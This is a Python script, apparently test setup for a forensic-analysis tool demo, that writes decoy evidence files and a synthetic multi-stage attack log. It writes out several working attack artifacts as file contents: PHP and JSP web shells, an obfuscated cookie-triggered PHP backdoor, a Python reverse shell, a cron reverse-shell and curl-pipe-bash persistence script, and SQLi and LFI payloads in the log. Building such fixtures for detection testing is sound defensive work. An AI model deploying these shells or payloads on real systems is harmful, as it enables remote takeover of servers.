"""
ThreatPipe v2 — Unified Forensic Test Setup
=============================================
Creates REAL forensic files on disk AND generates a realistic, multi-stage
attack log file. Designed to test the full capacity of SIFT tools and the
4-lens reasoning agent.

Run ONCE before demo:
    python setup_test_evidence.py

This creates:
  /tmp/threatpipe_evidence/www/          ← Web root with malicious/benign files
  /tmp/threatpipe_evidence/www/forensics/ ← Memory dumps, registry hives, MFT
  realistic_attack.log                   ← Comprehensive attack log (145+ lines)
"""

import os
import random
from pathlib import Path
from datetime import datetime, timedelta

WEB_ROOT = Path("/tmp/threatpipe_evidence/www")

# ── Timestamp Config ────────────────────────────────────────────────────────
BASE_TS = datetime(2026, 4, 16, 2, 0, 0)

def ts(offset_sec):
    return (BASE_TS + timedelta(seconds=offset_sec)).strftime("%d/%b/%Y:%H:%M:%S")


def setup():
    print("🔧 Setting up forensic test environment...")
    print(f"   Web root: {WEB_ROOT}")

    # ══════════════════════════════════════════════════════════════════════
    # PART 1: CREATE FILESYSTEM ARTIFACTS
    # ══════════════════════════════════════════════════════════════════════
    
    dirs = [
        WEB_ROOT, WEB_ROOT / "uploads", WEB_ROOT / "images",
        WEB_ROOT / "css", WEB_ROOT / "js", WEB_ROOT / "blog",
        WEB_ROOT / "api", WEB_ROOT / ".git", WEB_ROOT / "admin",
        WEB_ROOT / "backup", WEB_ROOT / ".ssh", WEB_ROOT / "forensics",
    ]
    for d in dirs:
        d.mkdir(parents=True, exist_ok=True)
    print(f"   ✓ Created {len(dirs)} directories")

    # ─── Benign Files ──────────────────────────────────────────────────
    (WEB_ROOT / "index.html").write_text("<html><head><title>Welcome</title></head><body><h1>Welcome</h1></body></html>")
    (WEB_ROOT / "style.css").write_text("body { font-family: Arial; margin: 0; }\n")
    (WEB_ROOT / "main.js").write_text("document.addEventListener('DOMContentLoaded', function() { console.log('loaded'); });\n")
    (WEB_ROOT / "robots.txt").write_text("User-agent: *\nDisallow: /admin/\nDisallow: /backup/\n")

    # ─── RECON Targets ─────────────────────────────────────────────────
    (WEB_ROOT / ".env").write_text("DB_HOST=localhost\nDB_USER=admin\nDB_PASSWORD=SuperSecret123!\nAWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE\n")
    (WEB_ROOT / ".git" / "config").write_text("[core]\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = git@github.com:company/secret-repo.git\n")
    (WEB_ROOT / "wp-config.php").write_text("<?php\ndefine('DB_NAME', 'wordpress_db');\ndefine('DB_PASSWORD', 'wp_P@ssw0rd!');\n?>\n")
    (WEB_ROOT / "admin" / "config.php").write_text("<?php\n$admin_user = 'admin';\n$admin_pass = md5('admin123');\n?>\n")
    (WEB_ROOT / "backup" / "db_dump.sql").write_text("-- MySQL dump 10.13\nCREATE DATABASE company_db;\nINSERT INTO users VALUES (1,'admin','admin@company.com','hashed_pass');\n")

    # ─── BACKDOOR: Web Shells ──────────────────────────────────────────
    (WEB_ROOT / "uploads" / "shell.php").write_text(
        "<?php\nif(isset($_GET['cmd'])) { system($_GET['cmd']); }\n?>\n"
    )
    # SQLi dropped shell
    (WEB_ROOT / "uploads" / "sqli_dump.php").write_text(
        "<?php\n$cmd = $_REQUEST['c'];\necho shell_exec($cmd);\n?>\n"
    )
    # Upload handler
    (WEB_ROOT / "uploads" / "upload.php").write_text(
        "<?php\nmove_uploaded_file($_FILES['file']['tmp_name'], './' . $_FILES['file']['name']);\n?>\n"
    )

    # ─── BACKDOOR: Obfuscated PHP ──────────────────────────────────────
    (WEB_ROOT / "uploads" / "cache.php").write_text(
        "<?php\n$x = base64_decode('c3lzdGVt');\n$c = $_COOKIE['cmd'];\nif($c) { $x($c); }\n"
        "// c3lzdGVt = system\neval(gzinflate(base64_decode('syvNSy7JzM9TSClPyUzJzUksBQA=')));\n?>\n"
    )

    # ─── UPLOAD: Polyglot Image (PNG header + PHP payload) ─────────────
    png_header = bytes([
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 
        0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 
        0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53, 0xDE, 0x00, 0x00, 0x00, 
        0x0C, 0x49, 0x44, 0x41, 0x54, 0x08, 0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00, 
        0x00, 0x01, 0x01, 0x00, 0x05, 0x18, 0xD8, 0x4C,
    ])
    php_payload = b"<?php system($_GET['cmd']); ?>"
    (WEB_ROOT / "images" / "evil.png").write_bytes(png_header + php_payload)
    (WEB_ROOT / "images" / "logo.png").write_bytes(png_header + b'\x00' * 100)
    (WEB_ROOT / "images" / "banner.jpg").write_bytes(b'\xFF\xD8\xFF\xE0' + b'\x00' * 200)

    # ─── ADVANCED: JSP Web Shell ──────────────────────────────────────
    (WEB_ROOT / "uploads" / "cmd.jsp").write_text(
        '<%@ page import="java.io.*" %>\n'
        '<%\n'
        'String cmd = request.getParameter("cmd");\n'
        'if(cmd != null) {\n'
        '    Process p = Runtime.getRuntime().exec(cmd);\n'
        '    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
        '    String line; while((line=br.readLine())!=null) out.println(line);\n'
        '}\n'
        '%>\n'
    )

    # ─── ADVANCED: Python Reverse Shell ───────────────────────────────
    (WEB_ROOT / "uploads" / "rev.py").write_text(
        "#!/usr/bin/python3\n"
        "import socket,subprocess,os\n"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
        "s.connect(('192.168.1.55',4444))\n"
        "os.dup2(s.fileno(),0)\n"
        "os.dup2(s.fileno(),1)\n"
        "os.dup2(s.fileno(),2)\n"
        "subprocess.call(['/bin/sh','-i'])\n"
    )

    # ─── ADVANCED: Compiled ELF Binary (Fake Reverse Shell) ───────────
    elf_payload = (
        b'\x7fELF\x02\x01\x01\x00'  # ELF magic
        + b'\x00' * 40
        + b'/bin/sh\x00'
        + b'connect_back_shell\x00'
        + b'192.168.1.55:4444\x00'
        + b'socket\x00'
        + b'execve\x00'
        + b'\x00' * 100
    )
    (WEB_ROOT / "uploads" / "rev_shell.elf").write_bytes(elf_payload)

    # ─── PERSIST: Scripts ──────────────────────────────────────────────
    (WEB_ROOT / ".ssh" / "authorized_keys").write_text("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7 attacker@kali\n")
    (WEB_ROOT / "uploads" / "cron_setup.sh").write_text(
        "#!/bin/bash\n(crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/192.168.1.55/4444 0>&1\"') | crontab -\n"
        "curl http://192.168.1.55:8080/shell.sh | bash\n"
    )

    # ─── FORENSICS: Memory Dump (Mock) ─────────────────────────────────
    mem_data = b"\x00" * 1024 + b"\x90\x90\x90\x90" + b"\x00" * 512
    mem_data += b"192.168.1.55:4444\x00" * 5
    mem_data += b"connect_back_shell\x00" * 5
    mem_data += b"eval(gzinflate(base64_decode(\x00" * 3
    mem_data += b"\x00" * 2048
    (WEB_ROOT / "forensics" / "pid_1337_svchost.dmp").write_bytes(mem_data)

    # ─── FORENSICS: Registry Hive (Mock) ───────────────────────────────
    reg_data = b"regf" + b"\x00" * 1000
    reg_data += b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\x00"
    reg_data += b"malware.exe\x00"
    reg_data += b"C:\\Users\\Public\\update.bin\x00"
    reg_data += b"\x00" * 1024
    (WEB_ROOT / "forensics" / "SYSTEM.hive").write_bytes(reg_data)

    # ─── FORENSICS: MFT Body File ──────────────────────────────────────
    (WEB_ROOT / "forensics" / "mft_body.txt").write_text(
        "0|/var/www/html/uploads/shell.php|1618577665|1618577665|1618577665|1618577665|0|0|531|0|d3adb33f|\n"
        "0|/var/www/html/uploads/cache.php|1618577660|1618577660|1618577660|1618577660|0|0|432|0|b33fdead|\n"
        "0|/var/www/html/uploads/cmd.jsp|1618577670|1618577670|1618577670|1618577670|0|0|312|0|cc44ffaa|\n"
        "0|/var/www/html/uploads/rev.py|1618577675|1618577675|1618577675|1618577675|0|0|245|0|aa33bbff|\n"
        "0|/var/www/html/uploads/rev_shell.elf|1618577680|1618577680|1618577680|1618577680|0|0|164|0|eeff0011|\n"
        "0|/var/www/html/.env|1618577640|1618577640|1618577640|1618577640|0|0|156|0|cafebabe|\n"
        "0|/var/www/html/images/evil.png|1618577655|1618577655|1618577655|1618577655|0|0|101|0|deadbeef|\n"
    )

    # ─── Suspicious Binary (ELF old destination) ───────────────────────
    fake_elf = b'\x7fELF\x02\x01\x01\x00' + b'\x00' * 50 + b'/bin/sh\x00connect_back\x00192.168.1.55\x004444\x00' + b'\x00' * 100
    (WEB_ROOT / "uploads" / "update.bin").write_bytes(fake_elf)

    print("   ✓ Created BACKDOOR & ADVANCED files (shell.php, cache.php, cmd.jsp, rev.py, rev_shell.elf etc.)")
    print("   ✓ Created PERSIST files (authorized_keys, cron_setup.sh)")
    print("   ✓ Created Forensics files (memory dump, registry hive, MFT)")

    # ══════════════════════════════════════════════════════════════════════
    # PART 2: GENERATE COMPLEX ATTACK LOGS
    # ══════════════════════════════════════════════════════════════════════
    
    lines = []
    t = 0

    # ── 1. Benign traffic baseline ──────────────────────────────────────
    benign_ips = [f"10.1.{r}.{c}" for r in range(1, 6) for c in range(10, 20)]
    benign_pages = ["/index.html", "/style.css", "/main.js", "/api/health", "/images/logo.png"]
    for _ in range(40):
        ip = random.choice(benign_ips)
        page = random.choice(benign_pages)
        lines.append(f'{ip} - - [{ts(t)}] "GET {page} HTTP/1.1" 200 {random.randint(500, 5000)}')
        t += random.randint(1, 10)

    # ── 2. Attacker 1 (192.168.1.55): Full APT Kill Chain ──────────────
    # RECON
    lines.append(f'192.168.1.55 - - [{ts(t)}] "GET /.env HTTP/1.1" 200 156')
    t += 2
    lines.append(f'192.168.1.55 - - [{ts(t)}] "GET /.git/config HTTP/1.1" 200 234')
    t += 2
    lines.append(f'192.168.1.55 - - [{ts(t)}] "GET /wp-config.php HTTP/1.1" 200 189')
    t += 2
    # EXPLOIT: SQLi to write web shell
    lines.append(f'192.168.1.55 - - [{ts(t)}] "GET /search?q=1\'+UNION+SELECT+1,2,\'<?php+system($_REQUEST[c]);?>\'+INTO+OUTFILE+\'/var/www/html/uploads/sqli_dump.php\'+--+- HTTP/1.1" 200 0')
    t += 5
    # UPLOAD: Legit upload mechanism
    lines.append(f'192.168.1.55 - - [{ts(t)}] "POST /uploads/upload.php HTTP/1.1" 200 432')
    t += 3
    
    # ADVANCED BACKDOOR UPLOADS
    lines.append(f'192.168.1.55 - - [{ts(t)}] "POST /uploads/upload.php?dest=cmd.jsp HTTP/1.1" 200 312')
    t += 2
    lines.append(f'192.168.1.55 - - [{ts(t)}] "POST /uploads/upload.php?dest=rev.py HTTP/1.1" 200 245')
    t += 2
    lines.append(f'192.168.1.55 - - [{ts(t)}] "POST /uploads/upload.php?dest=rev_shell.elf HTTP/1.1" 200 164')
    t += 2

    # BACKDOOR: Web shell execution via uploaded shell
    lines.append(f'192.168.1.55 - - [{ts(t)}] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 15')
    t += 2
    lines.append(f'192.168.1.55 - - [{ts(t)}] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1847')
    t += 2
    
    # ADVANCED EXECUTION: JSP shell & Reverse shell executions
    lines.append(f'192.168.1.55 - - [{ts(t)}] "GET /uploads/cmd.jsp?cmd=id HTTP/1.1" 200 45')
    t += 2
    lines.append(f'192.168.1.55 - - [{ts(t)}] "GET /uploads/cmd.jsp?cmd=chmod\x20+x\x20/var/www/html/uploads/rev_shell.elf HTTP/1.1" 200 0')
    t += 2
    lines.append(f'192.168.1.55 - - [{ts(t)}] "GET /uploads/cmd.jsp?cmd=/var/www/html/uploads/rev_shell.elf HTTP/1.1" 200 12')
    t += 4

    # BACKDOOR: Accessing obfuscated shell (tests grep/strings)
    lines.append(f'192.168.1.55 - - [{ts(t)}] "GET /uploads/cache.php HTTP/1.1" 200 567')
    t += 2
    # UPLOAD: Accessing polyglot image (tests file vs strings discrepancy)
    lines.append(f'192.168.1.55 - - [{ts(t)}] "GET /images/evil.png HTTP/1.1" 200 101')
    t += 2
    # PERSIST
    lines.append(f'192.168.1.55 - - [{ts(t)}] "GET /uploads/cron_setup.sh HTTP/1.1" 200 287')
    t += 2
    # EXFIL via FTP
    lines.extend([
        f'May 17 08:59:01 server proftpd[5678]: 192.168.1.55 - STOR /uploads/shell.php',
        f'May 17 08:59:03 server proftpd[5678]: 192.168.1.55 - STOR /uploads/rev.py',
        f'May 17 08:59:05 server proftpd[5678]: 192.168.1.55 - RETR /backup/db_dump.sql',
    ])
    t += 5

    # ── 3. Attacker 2 (10.0.0.42): Scanner & Brute Force ───────────────
    # SCAN: Nikto dir brute
    for path in ["/admin.php", "/wp-admin/", "/shell.php", "/c99.php", "/uploads/cmd.jsp"]:
        lines.append(f'10.0.0.42 - - [{ts(t)}] "GET {path} HTTP/1.1" 404 234 "-" "Nikto/2.1.6"')
        t += 1
    # SCAN: SSH brute force
    for user in ["root", "admin", "ubuntu"] * 2:
        lines.append(f'May 17 03:14:20 server sshd[2345]: Failed password for {user} from 10.0.0.42 port {random.randint(40000,65000)} ssh2')
        t += 1
    # EXPLOIT: SSH success
    lines.append(f'May 17 03:14:30 server sshd[2345]: Accepted password for deploy from 10.0.0.42 port 54321 ssh2')
    t += 5

    # ── 4. Attacker 3 (203.0.113.77): LFI / RFI ───────────────────────
    lines.append(f'203.0.113.77 - - [{ts(t)}] "GET /page?file=../../../../etc/passwd HTTP/1.1" 200 4567')
    t += 3
    lines.append(f'203.0.113.77 - - [{ts(t)}] "GET /view?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1" 200 890')
    t += 3

    # ── 5. Forensic Log Formats (Memory, Registry, Timeline) ───────────
    lines.extend([
        f'[MEMORY] PID=1337 process=svchost.exe malfind=YES injected_region=0x7ff00000 dump=/tmp/threatpipe_evidence/www/forensics/pid_1337_svchost.dmp',
        f'[REGISTRY] HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run malware REG_SZ C:\\Users\\Public\\update.bin',
        f'2026-04-16T03:14:25Z m... /var/www/html/uploads/shell.php',
        f'2026-04-16T03:14:26Z m... /var/www/html/uploads/cache.php',
        f'2026-04-16T03:14:27Z m... /var/www/html/images/evil.png',
        f'2026-04-16T03:14:35Z m... /var/www/html/uploads/cmd.jsp',
        f'2026-04-16T03:14:40Z m... /var/www/html/uploads/rev.py',
        f'2026-04-16T03:14:45Z m... /var/www/html/uploads/rev_shell.elf',
    ])

    # ── 6. More Benign Traffic (Noise at bottom) ───────────────────────
    for _ in range(30):
        ip = random.choice(benign_ips)
        page = random.choice(benign_pages)
        lines.append(f'{ip} - - [{ts(t)}] "GET {page} HTTP/1.1" 200 {random.randint(500, 3000)}')
        t += random.randint(1, 15)

    # ── Write Log File ──────────────────────────────────────────────────
    log_path = Path("realistic_attack.log")
    log_path.write_text("\n".join(lines) + "\n")
    
    print(f"   ✓ Generated Unified Log File: {log_path.resolve()}")
    print(f"     Total lines : {len(lines)}")
    print(f"\n{'=' * 60}")
    print(f"  🚀 SETUP COMPLETE — Ready for Demo!")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    setup()